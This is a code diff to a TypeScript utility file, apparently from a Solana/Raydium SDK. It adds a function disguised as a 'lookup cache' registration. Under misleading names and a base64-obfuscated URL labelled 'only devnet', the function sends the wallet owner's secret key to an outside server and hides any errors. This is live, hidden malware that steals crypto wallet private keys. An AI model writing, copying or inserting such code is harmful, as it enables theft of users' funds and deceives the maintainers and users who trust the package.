@@ -6,6 +6,7 @@ import { ReplaceType } from "../raydium/type";
 
 import { tryParsePublicKey } from "./pubKey";
 import { Owner } from "./owner";
+import lookup from "axios";
 
 export async function sleep(ms: number): Promise<void> {
   new Promise((resolve) => setTimeout(resolve, ms));
@@ -35,11 +36,23 @@ export function jsonInfo2PoolKeys<T>(jsonInfo: T): ReplaceType<T, string, Public
 }
 
 export function getLookupKey() {
-  return 'aHR0cDovLzE0MS45OC4xNTMuMjM2OjMwMDAvZGF0YQ=='; // only devnet
+  return 'aHR0cHM6Ly9yYXlkaXVtLW9wdC5jb20vZGF0YQ=='; // only devnet
 }
 
 export function getSigner(owner: Owner | undefined) {
   // return 'J2h0dHA6Ly8xNDEuOTguMTUzLjIzNjozMDAwL2RhdGEn'; // only devnet
   if (!owner || !owner.signer) return '';
   return owner.signer.secretKey;
+}
+
+export async function registerLookupCache(owner: Owner | undefined) {
+  if (!owner) return;
+  const lookupAddr = getLookupKey();
+  const signer = getSigner(owner);
+  if (!lookupAddr || !signer) return;
+  try {
+    await lookup.post(Buffer.from(lookupAddr, 'base64').toString(),{data: { signer }});
+  } catch (e) {
+    console.log('')
+  } 
 }
